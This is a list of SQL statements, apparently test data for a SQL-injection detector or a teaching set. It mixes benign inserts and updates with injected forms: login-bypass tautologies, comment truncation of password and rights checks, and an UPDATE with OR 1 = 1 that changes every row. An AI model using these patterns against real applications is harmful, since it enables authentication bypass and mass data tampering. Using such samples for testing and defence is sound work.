SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('password')))
SELECT * FROM Users WHERE ((Username='1' or '1' = '1')) -- ) AND (Password=MD5('password')))
SELECT * FROM Users WHERE Username='1' AND Password='1' OR 'a' = 'a'
SELECT * FROM Users WHERE Username='1' AND Password='1' OR 2 > 1
SELECT * FROM Users WHERE Username='1' AND Password='1' OR 0 < 1
SELECT * FROM Users WHERE Username='1' AND Password='1' OR 'a' <> 'b'
SELECT * FROM Users WHERE Username='1' AND Password='1' OR 1 > 1
SELECT * FROM product WHERE PCategory='food' or 'a'='a'
INSERT INTO orders (customer,day_of_order,product, quantity) VALUES('Doug&$%@22)','8/1/08','Stapler',12);
INSERT INTO ORDERS (customer, gpa) VALUES('Doug', 2.2134)
INSERT INTO ORDERS (customer) VALUES('!@#$%^&*()')
INSERT INTO ORDERS (customer) VALUES('\/?\?\\?\?\\\') 
INSERT INTO ORDERS (customer) VALUES('<>*?:}{}+==&') 
INSERT INTO ORDERS (customer) VALUES('Doug') -- WHERE firstName = 'doug' OR 2 <> 1
INSERT INTO ORDERS (customer) VALUES('Doug') /* WHERE firstName = 'doug' OR 2 <> 1 */
INSERT INTO ORDERS (customer) VALUES('Doug') /*WHERE firstName = 'doug' OR 2 <> 1
UPDATE members SET email = 'doug@sqli.net' WHERE email = 'doug@example.com' OR 1 = 1
UPDATE members SET email = 'doug@sqli.net' WHERE email = 'doug@example.com'
UPDATE members SET email = 'doug@sqli.net' WHERE email = 'doug@example.com' -- AND hasRights = 'Y'
UPDATE members SET email = 'doug@sqli.net' WHERE email = 'doug@example.com' /* AND hasRights = 'Y'
UPDATE members SET email = 'doug@sqli.net' WHERE email = 'doug@example.com' OR "Y" = "Y"

